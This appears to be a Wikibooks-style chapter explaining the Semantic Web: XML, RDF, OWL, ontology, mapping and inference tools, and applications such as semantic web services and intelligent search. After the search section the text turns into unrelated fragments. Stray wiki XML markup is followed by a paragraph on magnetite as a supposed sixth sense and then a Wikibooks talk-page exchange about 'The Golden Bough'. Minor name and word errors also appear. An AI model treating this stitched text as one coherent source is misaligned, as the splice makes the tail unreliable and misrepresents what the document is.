According to Tim Berners-Lee, the Semantic Web data model is analogous to the relational database model. “A relational database consists of tables, which consist of rows, or records. Each record consists of a set of fields. The record is nothing but the content of its fields, just as an RDF node is nothing but the connections: the property values. The mapping is very direct – a record is an RDF node; the field (column) name is RDF propertyType; and the record field (table cell) is a value. Indeed, one of the main driving forces for the Semantic Web has always been the expression, on the Web, of the vast amount of relational database information in a way that can be processed by machines.&quot; (Berners-Lees, 1998) That said, the Semantic Web is a much more expressive, comprehensive, and powerful form of data modeling. It builds on traditional data modeling techniques – be they entity-relation modeling or another form – and transforms them into much more powerful ways for expressing rich relationships in a more thoroughly understandable manner.

'''5.	The Semantic Web is not some magical piece of artificial intelligence'''

The concept of machine-understandable documents does not imply some form of magical artificial intelligence that allows machines to comprehend human mumblings. It only indicates a machine's ability to solve a well-defined problem by performing well-defined operations on existing well-defined data (Berners-Lee, Handler, and Lassila, 2001). Current search engines perform capabilities that would have been magical 20 years ago, but that we recognize now as being the result of IP protocols, HTML, the concept of websites, web pages, links, graphical browsers, innovative search and ranking algorithms, and, of course, a large number of incredibly fast servers and equally large and fast disk storage arrays. Semantic Web capabilities will likewise be the result of a logical series of interconnected progressions in information technology and knowledge representation formed around a common base of standards and approaches.

'''6.	The Semantic Web is not an existing entity, ready for users to make use of it.'''

The Semantic Web currently exists as a vision, albeit a promising and captivating one. Similar to the current Web, the Semantic Web will be formed through a combination of open standard and proprietary protocols, frameworks, technologies, and services. The W3C-approved standards – XML, RDF, and OWL – form the base protocols. New data schemas and contract mechanisms, built using these new protocols, will arise around communities of interest, industry, and intent; some will be designed carefully by experienced data architects and formally recognized by established standards bodies; others will appear from out of nowhere and gain widespread acceptance overnight. A host of new technologies and services will appear such as semantically-aware content publishing tools; context modeling tools; mediation, inference, and reputing engines; data-cleansing and thesaurus services; and new authentication and verification components. Although various elements of the vision already exist, rollout of these technologies, coordination amidst competitive forces, and fulfillment of the vision will take many years.

== Benefits ==

While the full vision of the Semantic Web may be a bit distant, there are, on the near horizon, capabilities that many think will make enterprise software more connectable, interoperable, and adaptable as well as significantly cheaper to maintain. The use of semantic approaches in combination with the existing and emerging semantics-based schemas and tools can bring immediate and/or near-term benefits to many corporate enterprise and government agency IT initiatives.

Semantic interoperability, for example, represents a more limited or constrained subset of the vision of the Semantic Web. Significant returns, however, can still be gained by using semantic-based tools to arbitrate and mediate the structures, meanings, and contexts within relatively confined and well-understood domains for specific goals related to information sharing and information interoperability. In other words, semantic interoperability addresses a more discrete problem set with more clearly defined endpoints (Pollock and Hodgson, 2004).
Semantic technologies can also provide a loosely connected overlay on top of existing Web service and XML frameworks, which in turn can offer greater adaptive capabilities than those currently available. They can also make immediate inroads in helping with service discovery and reconciliation, as well as negotiation of requests and responses across different vocabularies. Considering the depth and difficulty of issues the federal, state, and local agencies have in these regards, semantic technologies may provide the first flexible, open, and comprehensive means to solve them.

Semantic computing is an emerging discipline being formed and shaped as this is written. As such, there are many definitions and interpretations, and even a few low-intensity philosophical wars being waged among thought-leaders and practitioners. That said, the release of RDF and OWL as W3C Recommendations earlier in the year has created a greater commonality in expression.

Because semantic computing makes use of various forms of abstraction and logical expression, it can be difficult to see how the languages provide many of the powerful capabilities expressed in earlier sections. But just as the Internet and World Wide Web are built upon layers of protocols and technologies, so too is the Semantic Web. Understanding several key concepts and becoming familiar with the core building blocks of the Semantic Web will form a basis for visualizing how higher order tools, components, and technologies can deliver on the promise of richer and more flexible machine-processable data. Understanding some of the foundational concepts will also allow readers to better understand the state of the technologies and the areas that still need to be refined in order to reach the full vision of the Semantic Web.


Semantic technologies differ from database schemas, data dictionaries, and controlled vocabularies in an important way: They have been designed with the connectivity in mind allowing different conceptual domains to work together as a network.

== Languages ==

'''1. XML (eXtensible Markup Language)'''

XML stands for eXtensible Markup Language and is a standard way of describing, transporting, and exchanging data that was pioneered by the W3C in the late 1990s. XML serves as a mechanism for marking up data through the use of customized &quot;tags&quot; in such a way as to describe the data. XML is not necessarily related to HTML and, in fact, the two were designed for entirely different purposes. Despite this fact, the two can complement each other in various ways, depending on a user's needs. 

The tags are typically the labels for the data such as “FirstName” or “StreetAddress.” When trying to use XML to define a standard interchange format, it is important to have agreement on the tags. For example, two book suppliers might wish to formalize a partnership involving data exchange. Specifying at the outset that Supplier A’s definition of “Author” is identical to Supplier B’s definition of “Writer” and codifying that in the XML structure would be an essential part of formulating proper data agreement. Additional terms that overlap and have the same meaning would also need to be formally identified, usually in something called a DTD or XML Schema. (XML Schema is a mechanism for defining XML documents in a formal way, thereby ensuring the accurate exchange of information.) 

Examples of XML Schemas in working use can be found in many government and industry registries.  According to the U.S. CIO Council XML Working Group, “The full benefits of XML will be achieved only if organizations use the same data element definitions and those definitions are available for partners to discover and retrieve. A registry/repository is a means to discover and retrieve documents, templates, and software (i.e., objects and resources) over the Internet. The registry is used to discover the object. It provides information about the object, including its location. A repository is where the object resides for retrieval by users.” 

In the context of semantics and the Semantic Web effort, XML is a set of syntax rules for creating semantically rich markup languages in particular domains. XML allows users to add arbitrary structure to their documents but says nothing about what the structures mean (Berners-Lee, Hendler, and Lassila, 2001). In other words, whereas IT systems, databases, and content management systems have become good at describing things, they have not done so well at describing associations. More concrete and faithful descriptions that provide better senses of words, terms, and domains are needed. 

'''2. RDF (Resource Description Framework)'''

RDF stands for Resource Description Framework and has been specifically designed to provide this associative information. RDF offers ways to make data richer and more flexible, and therefore able to exist in environments outside those explicitly defined by system programmers and data modelers. RDF encodes information in sets of triples, each triple being rather like the subject, verb, and object of an elementary sentence. (This same model can also represent resource, property, and value constructs.) RDF provides an infrastructure for linking distributed metadata and also serves in conjunction with OWL as a core language for describing and representing ontologies. 

One of the primary benefits of using RDF to describe data associations is the scalability and flexibility it provides. Explicit database tables can be created that do much the same thing but the unique nature of RDF provides a flexible mechanism that allows far greater associative capabilities, thereby increasing the ability to query and make inferences on topic matters not explicitly hard-wired into tables. The benefits only increase when trying to integrate new data sources, especially when they have different structures or semantics or, more importantly, when they cross conceptual domains (as in the case of environmental and public health data or, alternatively, law enforcement and intelligence data). 
RDF triples are serialized in XML, providing a way to describe relationships between data elements using XML tags or other syntax in a format that can be easily processed by machines. In an effort to support a loosely coupled and/or virtual architecture, a Universal Resource Identifier (URI) is used to identify each of the triple elements. The purpose of a URI is to uniquely identify a concept in the form of subject, verb, or object by linking to the origin where the concept is defined.

RDF Schema (sometimes written as RDFS or RDF-S) offers a way of semantically describing and extending RDF. It provides mechanisms for describing groups of related resources and the relationships among these resources. RDF Schema does the same thing for RDF that DTD and XML Schema do for XML.
A number of query languages for RDF have been developed within academic and industry circles. In October 2004, the W3C RDF Data Access Working Group released a draft specification for SPARQL (pronounced &quot;sparkle&quot;), a query language for RDF that seeks to unify the way developers and end users write, and to consume RDF search results across a wide range of information. 

'''3. OWL (Web Ontology Language)'''

OWL stands for Web Ontology Language. (The acronym is purposely transposed from the actual name – OWL instead of WOL – as a conscious link to the name of the owl in the book Winnie the Pooh.) Whereas RDF's primary value can be seen in enabling association and integration of distributed data, OWL's main value is in enabling reasoning over distributed data. 

OWL is a highly expressive modeling language that is compatible with existing data stores and modeling constructs including XML, Rational, and object-oriented approaches. OWL also provides loosely-coupled “views” of data which makes federated knowledge bases easy to build and evolve. Most importantly, OWL has machine-actionable semantics. Run-time and design-time software tools can do “things” with models, data, metadata, rules, and logic without human assistance or highly specific application code. (Pollock, 2004) 

OWL is derived from a number of efforts to develop a set of flexible and computational logic constructs, many of which go back many years. It is the next generation of the ontology language called DAML+OIL, which in turn integrated two efforts, DAML, the DARPA Markup Language, an effort that was based in the United States, and OIL, the Ontology Inference Layer (or Language), an effort that was based in Europe. It also has roots in SHOE (Simple HTML Ontology Extensions), an effort led by James Hendler at the University of Maryland, created specifically for incorporating machine-readable knowledge into web documents thereby facilitating intelligent agent capabilities. There are three levels of OWL defined (OWL Lite, OWL DL, and OWL Full) each having progressively more expressiveness and inferencing power. These levels were created to make it easier for tool vendors to support a specified level of OWL.RDF and OWL can operate together or separately. In some cases, supporting the distributed nature of data may be the primary objective, in which case only RDF may be used. In other cases, distribution plus reasoning capabilities may be desired, and so both RDF and OWL may be featured. In other instances, just reasoning capabilities are desired, and so OWL may suffice.

'''4. Other Language Development Efforts'''

Other languages are currently being developed to address additional layers within the Semantic Web vision. For example, a Rule language will provide the capability to express certain logical relationships in a form suitable for machine processing. This language will allow the expression of business rules and will provide greater reasoning and inference capabilities. RuleML was initially proffered as a rule language, although efforts to formalize the Semantic Web Rules Language (SWRL) are currently underway at W3C. A Logic language will conceivably provide a universal mechanism for expressing monotonic logic and validating proofs. A long-term hope is to eventually make use of assertions from around the Web to derive new knowledge. (The problem here is that deduction systems are not terribly interoperable. Rather than designing a single overarching reasoning system, current activities are focused on specifying a universal language for representing proofs. Systems can then digitally sign and export these proofs for other systems to use and incorporate.)

Likewise, constructs, schemas, and architectures for inferring reputation and trust are also being developed, both within the W3C and by the larger web community. These approaches are being looked at not just to infer reputation and trust by and among individuals, but also of groups of people (such as companies, media sources, non-government organizations, and political movements), inanimate objects (such as books, movies, music, academic papers, and consumer products), and even ideas (such as belief systems, political ideas, and policy proposals). (Masum and Zhang, 2004)
One challenge faced by practitioners in the field is to create frameworks and languages with sufficient expressiveness to capture the knowledge that can be described in ambiguous human languages. At issue is how to create languages, tools, and systems that will support the easy expression of simple things, while making it possible to express complex things. Another challenge is to maintain compatibility with existing syntax standards such as HTML, XML, and RDF while dealing with issues pertaining to the readability and human accessibility of the syntax. Ultimately, better tools will be developed that will minimize these issues but in the meantime complexities within some of the higher order languages may make it more difficult to develop fully compliant implementations using current editing and modeling tools.

== Semantic Tools and Components ==
 
''''&quot;Semantic Web tools are getting better every day. New companies are starting to form. Big companies are starting to move.&quot;''''

-James Hendler 

Several models exist that describe the lifecycle or stages of maturity that technologies go through. Typically these have four stages: entry (or definition), growth (or validation), maturity (or refinement), and decline (or consolidation). By most measures, the Semantic Web, as experienced in a publicly available format, is still in the entry/definition phase. Many of the semantic technologies, however, are well into the growth/validation phase. (The shift into maturity is often elusive; the tipping point being visible only after the fact, and at times passing through a period of hype and unmet expectations.)

Leaders in technology applications across government and private industry have been forging new paths and obtaining successful results from their semantic implementation projects. There are semantic research projects in a number of federal agencies. Semantic products are available from large and established companies such as Adobe, Hewlett Packard, and IBM, as well as from many small pioneering companies such as Unicorn, Network Inference, and Semagix. In addition, there are a number of open source and publicly available tools created by public and private research institutions and organizations.

What follows is a brief survey of commercial and open source tools that can be used to create applications powered by semantic technologies. One way to understand how these tools work together is to view them as either design-time tools or run-time tools. Design-time tools are used by document authors, system designers, and others as part of the creation, design, or authoring process. Examples include tools to create metadata or to create or populate ontologies. Other software components are used as run-time components to process queries, transform data, or otherwise produce operational results. Examples include mediation servers and inference engines. Many of the tools are used as a set within an implementation process – for example, modeling and mapping tools during design-time in partnership with query facilities and mediation servers at run-time.

'''Metadata Publishing and Management Tools'''

The process for creating metadata about a document or data item can occur when that item is created or authored, when it is imported into a content management system or a website, or when it is viewed or read by users. It can also be added by some other explicit or implicit action at any point over the course of the existence of that data item. In other words, metadata creation is not just a one-time occurrence. Metadata can continue to accummulate and can be modified at any time by conceivably any number of people.

At content creation, authors typically connect information such as the subject, creator, location, language, and copyright status with a particular document. This information makes the document much more searchable. RSS consists essentially of this type of information, providing newsreading applications with significantly expanded capabilities for searching and filtering information. Moveable Type from a company called SixApart is one of the more popular tools in the blogging community for creating RSS-compliant documents. The increasing popularity and simplicity of RSS is causing its use to extend outside of the blogging community into the general media and even into the enterprise. Other vendors of desktop and web-authoring tools are also moving quickly to provide RSS publishing capabilities.

The creation of metadata is only one step in the process. Metadata management tools are needed in order to maintain metadata vocabularies, perform metadata-driven queries, and provide visualization tools for monitoring changes in areas of interest. An example of a website that uses metadata as a key aspect of creating a collaborative and shared system of data is Flickr, a site for people to easily upload and share digital photos. What sets it apart from other digital photos services is that it provides photo-tagging capabilities as well as an innovative interface for viewing the categories of photos. (The tags are contained in a map and vary in size depending on the frequency of the tag within the data store.) What distinguishes it from earlier metadata implementations is that the feedback loop is extremely tight, meaning that the assignment of tags is bound closely to their use. As soon as photos and sets of photos are tagged, users see clusters of items carrying the same tag. Users can easily change tags to refine the clusters. 
In terms of tools for querying metadata, the components are not much different than current search engines, although the inclusion of metadata makes for richer data and therefore more precise and relevant searches. Query scripts and languages will likely adapt to allow users more precision although the balance between simplicity and features is constantly in flux, especially in more publicly available search engines. As with the Flickr example above, however, new visualization tools are being developed to help users navigate through complex fields of related data. 

'''Modeling Tools (Ontology creation and modification)'''

Modeling tools are used to create and modify ontologies. Knowledge modelers used them to create and edit class structures and model domains.  The tools often have an interface that is similar to a file system directory structure or bookmark folder interface. They also tend to offer the ability to import, transform, and re-purpose, in whole or in part, existing ontological structures that are often in the form of database schemas, product catalogues, and yellow pages listings. Other prominent feature includes advanced mechanisms for organizing, matching, and associating similar terms and concepts. 

Also, because it is a common practice for modelers to create smaller interconnected ontologies instead of a single large monolithic model – primarily for better reusability and ease of use – support for splitting, merging, and connecting models can be an important capability in the ontology editor. Some editors even support collaborative work methods and rich visualization and graphical interaction modes.
Protégé-2000 is a free ontology editor from Stanford University with a large and active user community. It features an open architecture that allows independent developers to write plug-ins that can significantly extend Protégé capabilities. Commercial modeling tools are available from a number of vendors including Network Inference, Language and Computing, and Intelligent Views. 
IBM’s Ontology Management System (also known as SNOBASE, for Semantic Network Ontology Base) is a framework for loading ontologies from files and via the Internet and for locally creating, modifying, querying, and storing ontologies. Internally, SNOBASE uses an inference engine, an ontology persistent store, an ontology directory, and ontology source connectors. Applications can query against the created ontology models and the inference engine deduces the answers and returns results sets similar to JDBC (Java Data Base Connectivity) result sets. As of the time of publication of this paper, SNOBASE is not, however, compatible with OWL. The Sigma ontology development and reasoning system is also a fully formed design and run-time ontology management system. It can be freely licensed although it, like SNOBASE, is not compliant with OWL.

'''Ontologies'''

Arriving at the right ontology is often a critical element of successful implementation of semantics-based projects. Even more so than database design, ontology creation is a highly specialized field. Not only are there not as yet a sizeable number of skilled practitioners, it can take considerable time to arrive at an ontology that successfully captures a conceptual domain. As a result, it is important to look at existing bodies of work that can be used (and reused) in lieu of having to create something from scratch. Likely sources of existing ontologies can typically be located in close association with ontology modeling tools, several of which are named above. Use of proprietary ontologies may be contingent upon licensing of the modeling tools, a practice which is not unreasonable considering the efforts expended to develop the ontologies. Other ontologies, however, may be open and free for use for commercial and non-commercial purposes, much in the vein of Linux, JBoss, Wikipedia, Musicbrainz, and other open source software and data repositories. 

Current ontology development efforts vary in scope and size. Some ontologies have been developed specifically in answer to localized implementations such as reconciling charts of accounts or health care records, areas where the emphasis is primarily on information interoperability – arbitrating between syntaxes, structures, and semantics – and less on logic programming. Other ontology development efforts take a more top-down approach under the assumption that a shared view of a wide knowledge domain is critical to widespread proliferation of adaptive computing and intelligent reasoning capabilities. There is significant advocacy in these latter circles on the establishment of an enterprise-wide common upper ontology under the belief that it will provide the foundation for any number of domain ontologies. New domain ontologies could be extensions of, and fully compliant with, this upper ontology. Existing ontologies and legacy data models could be mapped to this upper ontology, which theoretically would constitute a significant number of the steps toward achieving greater semantic interoperability across domains. (It should be noted, however, that additional development and engineering is still needed to demonstrate the feasibility and scalability of this approach.)

Several candidate upper ontologies now exist, including DOLCE (Gangemi, et al., 2002), Upper Cyc (Lenat, 1995), and SUMO (Niles and Pease, 2001), but none of these as yet has gained significant market adoption. Proponents of this upper ontology approach believe that were the U.S. Department of Defense and/or the Federal Government to adopt one of these candidates, there is a good chance industry would follow, after which the US could then propose it as a standard to the International Standards Organization. 

Even where domain-specific ontologies do not exist, it is possible to jumpstart development by making use of existing taxonomies, XML standards, or other lower order data models. At the federal level, the Knowledge Management working group (http://km.gov) has made significant progress in sharing information about taxonomy projects across agencies. XML.Gov (http://xml.gov) has a mission to facilitate efficient and effective use of XML across agencies in order that seamless sharing of documents and data can be achieved. Many government agencies have existing taxonomies, or have begun to develop taxonomies for their information domains. JusticeXML, for example, is an impressive body of work that could be extended and enhanced by RDF and OWL to provide a more flexible data model, an effort that could pave the way for far easier access to federal, state, and local law enforcement information by other agencies.

'''Mapping Tools (Ontology population)'''

Once an ontology model is created, it needs to be populated with data (referred to as class instances in “ontology speak”). This process is usually accomplished by linking various data sources to the concepts in an ontology using a mapping tool. Once “maps” have been created, a query in one data source could be transformed by its map to the ontology and then from the ontology to the other data sources using their maps. The corresponding data could then be returned in the same manner without any of the data stores knowing or caring about the others. In other words, each data source may have a unique “map” to an overarching ontology that acts as a pivot table among the various sources and targets. Providing this abstraction layer requires some effort on the part of creating the ontology and then creating the data maps, but once this has been done each data source can interoperate with other data sources strictly within run-time processes. Bringing new data sources onboard will, in most cases, have little or no effect on existing data sources.

This process drastically reduces the amount of data value mapping and semantic conflict resolution that typically takes place using current enterprise application approaches – approaches that up to now typically require n-squared mappings (mapping from and to each and every data source) or alternatively, exporting to hard-coded, inflexible, and explicit standards. The modeling and mapping process makes the process far less political and far more flexible and adaptable. Anomalies specific to a single data source, for example, can be handled almost transparently, whereas addressing such anomalies within the typical standards process would entail expending significant time and energy. Most of the tools used to handle structured data forms have features that automate the process of mapping database fields to ontologies. Network Inference and Unicorn are two vendors with tools of this type. Tools that aggregate, normalize, and map unstructured data forms to ontologies typically work with a variety of unstructured data forms including Word, RTF, text files, and HTML. Semagix is a leading vendor for unstructured data.

'''Data Stores'''

Ontologies and other RDF data models can be stored in native RDF data stores or in relational databases that have been customized to support associative data techniques. Native RDF-data stores are inherently designed to support the concept of triples and can offer an efficient out-of-the-box approach to storing ontologies. RDF native databases are available from companies such as Tucana Technologies and Intellidimensions. Several high-quality open source RDF data stores also exist, including Kowari, Redland, Sesame, and 3Store. To use a relational database, the database must be designed in a somewhat non-traditional way. Instead of having a table that describes each major concept, the database design typically mimics the concept of triples by using a single table containing four columns. Three of the columns store the triple while the forth column is used to store its identification tag. (A report entitled “Mapping Semantic Web Data with RDBMSes” is an excellent resource for finding out more about implementing triple stores in relational databases.)  

Issues related to representing, storing, and querying using triples (i.e., RDF) versus traditional relational approaches, as well as the use and/or co-existence of the two types of data stores within implementations, are still working themselves out within industry and the marketplace. Each store-and-query facility provides unique capabilities that the other, at present, does not. RDF is great for situations when it is difficult to anticipate the types of queries that will be performed in the future. It is also terrific for handling metadata and for making queries that require inferences across imprecise or disparate data. For example, a query along the lines of, “How many energy producers qualify for ‘green’ status this year?” is much easier to perform using an RDF query language than in SQL (once the models have been created to tie together various data stores). At the same time, queries that are trivial in SQL, such as, “Which energy producers reduced their CO2 output the most this year?” can be quite complicated using an RDF query language.

It is important to note that RDF query languages are still evolving, which may to some extent explain this limitation. Other limitations of RDF relate to performance issues. Because queries can be broadened, for example, to include concepts instead of just terms, the search space can be dramatically increased. Because RDF data stores are relatively new and the number of implementations relatively small, system developers need to iterate over their designs, paying particular attention to queries and functions that could have negative effects on performance. In terms of industry growth, it is difficult to predict how RDF will affect the database industry. RDF data stores may remain a distinct data storage category in their own right or their capabilities may be subsumed into relational databases in a manner similar to what happened with object-oriented databases.

'''Mediation Engines'''

Mediation engines are automated tools that can dynamically transform data among different syntaxes, structures, and semantics using models instead of hard-wired transformation code. They are critical components of any interoperability architecture. Using data maps, ontologies, and other forms of conceptual models, mediation engines are run-time processes that provide an abstraction layer between heterogeneous data sets, allowing organizations to essentially agree to disagree about how data and information should be represented. Mediation engines typically work with highly structured data. Unstructured and semi-structured data must first be bound to a schema prior to creating the mediation maps (Pollock, 2004). 

'''Inference Engines'''

Inference engines (sometimes referred to as reasoners) are software tools that derive new facts or associations from existing information. It is often said that an inference engine emulates the human capability to arrive at a conclusion by reasoning. In reality, inferencing is not some mythical artificial intelligence capability but, rather, a quite common approach in data processing. One can think of a complex data mining exercise as a form of inferencing. By creating a model of the information and relationships, we enable reasoners to draw logical conclusions based on the model. A common example of an inference is to use models of people and their connections to other people to gain new knowledge. Exploration of these network graphs can enable inferences about relationships that may not have been explicitly defined.
Note that with just RDF and OWL, inferences are limited to the associations represented in the models, which primarily means inferring transitive relationships. With the addition of rule and logic languages, however, greater leaps in conceptual understandings, learning, and adaptation can take place, although implementations with these types of capabilities are, as yet, few and far between. 
Both free and commercial versions of inference engines are available. For example, Jena, an open source Java framework for writing Semantic Web applications developed by HP Labs, has a reasoner subsystem. Jena reasoner includes a generic rule based inference engine together with configured rule sets for RDFS and for the OWL-Lite subset of OWL Full. JESS is a popular OWL inference engine from Carnegie Melon University. Network Inference offers a commercial reasoner based on description logic (OWL-DL).

'''Other Components'''

Ordinary web pages are a good source of instance information; many tools for populating ontologies are based on annotation of web pages. W3C Annotea project offers free annotation tools. Commercial vendors include Ontoprise and Lockheed-Martin. Several software vendors, including Semagix, Siderian Software and Entopia, offer products that use ontologies to categorize information and to provide improved search and navigation.  

'''Applications of Semantic Technologies''' 

''Semantic technologies can solve problems that, using current technologies, are unsolvable at any price.''

-Don Hall 

There are a wide variety of applications where semantic technologies can provide key benefits. At their core, semantic approaches are an infrastructure capability that, when combined with other key technologies, represent the next wave of computing. When taken with a multi-year view, there is great promise that these technologies will help the IT industry reach the ever-elusive goal of truly adaptive computing. In some respects, though, the future is already happening. Commercial enterprises and government agencies are implementing production-level programs using existing semantic data stores, ontologies, toolsets, and applications. A few of these near-term project areas include Semantic Web services, semantic interoperability, and intelligent search.

== Semantic Web Services ==

A Web service is a software system designed to support interoperable machine-to-machine interaction over a network. A Web service has an interface described in a machine-processable format using Web Services Description Language (WSDL).  The combination of WSDL, UDDI,  and SOAP  form a triad of technologies that will shift the entire market toward service-oriented architectures (SOA). Together, these technologies provide directory, component lookup, and exchange protocol services on top of an HTTP or SMTP network protocol. 
Microsoft, IBM, and most other large software vendors have embraced the concepts and languages that underlie the Web services model, and an increasing number of books and industry articles point to the benefits of adopting a service oriented architecture. Web services, however, are not without shortcomings. Security issues have long been a concern but several solutions that address these issues have been introduced over the last several years. Perhaps the most significant improvement opportunities for Web services that remain are in the areas of 

(a) flexible look-up and discovery and 

(b) information management and schema transformation. 

Fundamentally, Web service technologies handle messages in a loosely coupled manner but they do not currently bridge differences in description terminologies nor do they inherently enable the recipient to understand a message that has been sent.  With Web services, these parts of the exchange rely on custom-coded solutions and/or widespread community agreement upon some kind of document exchange standard (the latter is rarely achieved). 

This difficulty in ensuring flexible discovery and service initiation, as well as seamless operational use of information exchanged with Web services, has led to W3C’s efforts to incorporate semantic technologies as part of its Semantic Web Services initiative. Semantic Web Services are a Web Service implementation that leverages the Web Ontology Language Service specification (OWL-S) to provide a flexible framework for describing and initiating web services. OWL-S supplies Web service providers with a core set of markup language constructs for describing the properties and capabilities of their Web Services in unambiguous, computer-interpretable form. OWL-S markup of Web services will facilitate the automation of Web service tasks, including automated Web service discovery, execution, interoperation, composition, and execution monitoring. Following the layered approach to markup language development, the current version of OWL-S builds upon W3C’s standard OWL.


== Semantic Interoperability ==

Formally put, the use of semantic technologies makes it possible to describe the logical nature and context of the information being exchanged, while allowing for maximum independence among communicating parties. The results are greater transparency and more dynamic communication among information domains irrespective of business logic, processes, and workflows (Pollock and Hodgson, 2004). 

The technical vision is one where flexible information models, not inflexible programs or code, are used to drive dynamic, self-healing, and emergent infrastructures for the sharing of mission critical data in massively scaleable environments. Recent advances in taxonomy and thesaurus technology, context modeling approaches, inferencing technology, and ontology-driven interoperability can be applied in a cohesive framework that dramatically changes the way information is managed in disperse, decentralized communities of knowledge (Pollock and Hodgson, 2004).

NASA views semantic interoperability as an extremely promising way to make information available to all stakeholders without having to standardize on a particular format or vocabulary or re-key databases to conform to a uniform model. One example where NASA is using these concepts is to address serious and ongoing maintenance problems related to the aging wiring systems within the Space Shuttle fleet. The existing set of wiring system databases contains information about part specifications, bills of materials, drawings, change orders, standard practices, test procedures, test reports, inspection reports, failure tracking and reporting information, work orders, and repair disposition documentation. Tens of diverse databases and systems – each supporting different but related aspects of engineering and design work – are in use within NASA with related data dispersed among several contracting companies that support the Space Shuttle program. Troubleshooting wiring problems requires timely access to many cross-organizational systems, databases, and knowledge repositories, the breadth of which is enormous. The situation becomes especially critical for diagnosing and troubleshooting in-flight anomalies whereby a timely resolution is mission-critical as well as life-critical.  The work to make these sets of data richer and more accessible to the numerous parties who need access to them is still in its early stages, but as highlighted in the quote at the beginning of this chapter, semantic technologies represent one of the more promising ways to address what is largely an unsolvable problem using current data integration approaches.

A highly distilled version of how such a project works is as follows. Design-time tools are used to develop RDF and OWL models that encompass a particular domain. These models could be based on existing XML standards or defined via other means. Other design-time tools can be used to flexibly map specific data representations to these models, thus eliminating the need to explicitly convert applications to adopt a certain data standard. Run-time processes can then use these models and maps as pivot tables to transform data from source to target or to perform federated queries from a single query statement. Semantic interoperability frameworks of this type can provide a solid basis for better resolving differences in syntax, structure, and semantics – ushering in a future where organizations can agree to disagree, yet still share data and interoperate without having to change their current methods of operation.

One of the key advantages of using semantic interoperability approaches is that they do not necessarily require the replacement of existing integration technologies, databases, or software applications. A semantic framework made up of various semantics-based components and application program interfaces (APIs) can be deployed with web services or traditional middleware APIs to leverage existing infrastructure investments, and yet still provide massive benefits by virtually centralizing the query, transformation, and business rules metadata that flows through the network infrastructure’s pipes. As such, the software will fit into the customer’s existing IT ecosystem with low overhead for installation, minimal coding, and maximum reusability (Pollock and Hodgson, 2004).

== Intelligent Search ==

Related in some regards to semantic interoperability is the area of intelligent search. As mentioned above, semantic interoperability techniques can allow queries native to one system to be federated to other non-native systems. This eliminates the need to convert systems to a universal query language and enables systems to continue maintaining the information they have in their current formats. By overlaying a virtual layer on top of the data sources, queries can be defined in a universal manner, thereby enabling access to all mapped assets. Federated searching can also be made smarter by making searches more semantically precise. In other words, searches can be broadened to include concepts, or narrowed to include only specific key words. The depth – or granularity – of such searches enables the specification of the search that the individual desires. 
Another aspect of intelligent search is the ability to make searches more relevant to the person searching by making use of identity and relationship information. Relationships among people and information about them can be key links to greater relevance and confidence. Despite investments in knowledge management systems, many people still rely on their personal network of friends, neighbors, co-workers, and others to locate experts or find trusted information. Personal relationships are also useful in sales situations and in many organizational interactions. Social networking schemas and software are making broad use of this.

An example of how this information can be used on a larger scale is the case of a telephone company exploring technologies for providing more intelligent phone number look-up. Instead of providing a generic list of matched names, the telecommunications company is looking at combining information about the person searching and the list of possible names, in order to provide a more intelligent match. For example, inferring relationships between social networks could provide information on whether a person is known, or could be expected to be known, to the other person (by employing friend-of-a-friend forms of calculations). Other information such as locations or schools attended or past or current jobs could be used to infer matches. To be sure, there are significant privacy issues involved; many believe, however, that techniques such as hashing and encryption  of personally identifiable information and progressive disclosure will likely resolve many privacy concerns.
Semantic approaches for enabling intelligent search are beginning to find their ways into knowledge management systems. Whereas current knowledge management systems tend to exist within their own silos and have difficultly crossing organization boundaries, intelligent search techniques can be added as overlays to existing information infrastructures, thereby bridging physical data formats, knowledge domains, and organizational structures.

      <comment>let's remove the non scientific mumbo jumbo</comment>
      <text xml:space="preserve">It has been suggested by those outside of mainstream science that magnetite gives organisms a sort of '6th sense', with which they can predict events in the near future (for example, earthquakes and other difficult-to-predict phenomena). Clearly this is not possible if existing scientific theories of time are accepted.

A more plausible idea is that magnetite's weak magnetic field provides some information that can be processed by an organism's central nervous system.  The degree to which this information could be gathered, processed, and perceived is not established. More conservative researchers believe the magnetite acts as a tiny compass which might explain, for example, how migratory birds seem to know the difference between north and south, as exhibited by their migratory patterns.

      <text xml:space="preserve">==''The Golden Bough'' and hello!==
:Welcome to Wikibooks. I hope you enjoy being around here and doing many interesting things.
:It was a good idea of yours to put ''The Golden Bough'' on Wikibooks, and I would be interested to see what interactive and graphical stuff you and others might be able to put on it.
:However, if it is just a textbook (I mean, only text) it would belong better on Wikisource. If we could interact with it and put our own views, thoughts and exercises, as well as bring more modern myths to it. I am aware that there is a lot of the developing world that has not seen this text, and may well have different opinions about the material.
-[[User:EuropracBHIT|EuropracBHIT]] 03:58, 18 Mar 2005 (UTC)


:I will put the text on wikisource as well. The more developed e-book will be at wikibooks
:Thanks for the advice.

== Organization of the Golden Bough ==

Hi! I had a look at your book [[The Golden Bough]]: A Study in Magic and Religion. There is some discussion about how to organize books at [[Wikibooks:Hierachy naming scheme]], and I would like to give you the following suggestion:
* tgb is not a good way to separate your book from others.
* I recommend you to use &lt;nowiki&gt;[[The Golden Bough]] for the book and [[The Golden Bough/Preface]],[[The Golden Bough/The King of the Wood]], etc. &lt;/nowiki&gt;, that is create subpages to your book using the &quot;/&quot; slash command. In this way you will automatically get a link back to your main book, if it has the same name throughout (have a look at the book [[Hamster Care]] how it is done there.)
* For successful and not so successful alternatives have a look at [[Wikibooks:Hierachy naming scheme]]. 
I know you invest a lot of time into your book. Please consider make it a lasting effort. Thanks, and good luck in the future. If you have questions or need help, just let me know. --[[User:Andreas Ipp|Andreas]] 15:25, 18 Mar 2005 (UTC)

:Thanks Andreas, that makes sense. I will read up on how to change / move to that scheme. I have only added two chapters at the moment good thing you told me now. DO you have a quick link on how to rename the initial book or move the already created chapters. [[User:Ojmorales0002|Ojmorales0002]] 15:34, 18 Mar 2005 (UTC)

:: If you are logged in, then you should have the &quot;move&quot; command on top of the page, with which you can rename a page. This is the best way to do things. If you don't have this command, then I can also move the pages for you, if you want. --[[User:Andreas Ipp|Andreas]] 15:45, 18 Mar 2005 (UTC)

::: I did it for the main page [[The Golden Bough]], worked fine, will do the other pages before continuing and Ill check any pages refrencing them as well. again, thanks a lot [[User:Ojmorales0002|Ojmorales0002]] 16:02, 18 Mar 2005 (UTC)

: I redid all the links, its actually easier with the naming as you suggested, like directories in DOS. Thanks again, [[User:Ojmorales0002|Ojmorales0002]] 18:35, 18 Mar 2005 (UTC)

